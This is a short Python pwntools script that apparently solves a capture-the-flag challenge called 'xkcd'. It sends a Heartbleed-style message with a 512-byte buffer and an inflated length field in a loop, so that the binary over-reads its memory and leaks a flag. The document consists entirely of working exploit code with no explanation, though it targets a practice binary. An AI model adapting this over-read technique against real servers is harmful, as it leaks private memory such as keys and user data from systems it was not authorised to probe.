#!/usr/bin/env python3
# -*- coding:utf-8 -*

from pwn import *
from sys import argv
from time import sleep

context.terminal = ['terminator','-e']
context.log_level = "debug"

chall = "./xkcd"
#libc = ELF()
elf = ELF(chall)
context.binary = chall
context.binary.checksec()

msg_header = "SERVER, ARE YOU STILL THERE? IF SO, REPLY "
buffer = "A" * 512
memcpy_count = len(buffer)+1

for i in range(257):
    p = process(chall)
    payload = '%s"%s" (%d)' % (msg_header, buffer, memcpy_count + i)
    p.sendline(payload)

    responce = p.recvline()
    if (b'NICE TRY' in responce):
        break
    else:
        print("Found !")
        flag = responce

print(flag)
